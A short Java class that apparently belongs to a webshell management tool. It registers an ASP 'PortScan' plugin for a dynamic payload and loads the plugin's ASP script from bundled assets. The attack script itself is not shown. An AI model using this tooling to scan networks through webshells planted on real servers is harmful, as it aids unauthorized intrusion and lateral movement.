package shells.plugins.asp;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.PortScan;
import util.functions;

@PluginAnnotation(
   payloadName = "AspDynamicPayload",
   Name = "PortScan",
   DisplayName = "端口扫描"
)
public class APortScan extends PortScan {
   private static final String CLASS_NAME = "PortScan";

   public byte[] readPlugin() throws IOException {
      InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.asp", "PortScan"));
      return functions.readInputStreamAutoClose(inputStream);
   }

   public String getClassName() {
      return "PortScan";
   }
}
